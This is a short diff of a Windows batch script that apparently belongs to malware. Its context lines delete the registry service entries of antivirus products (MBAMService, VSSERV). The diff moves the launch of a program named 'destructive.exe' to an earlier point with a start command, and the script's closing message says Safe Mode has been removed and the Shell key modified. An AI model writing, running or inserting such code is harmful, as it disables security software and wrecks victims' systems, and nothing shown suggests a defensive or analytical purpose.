@@ -257,6 +257,8 @@ reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f
 
+start "C:\Program Files\utkudrk2\destructive.exe"
+
 setlocal enabledelayedexpansion
 
 set "targetDir=C:\Program Files\utkudrk2"
@@ -269,8 +271,6 @@ if exist "%targetDir%" (
         )
     )
 )
-
-"C:\Program Files\utkudrk2\destructive.exe"
 
 :: Confirm completion
 echo Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.
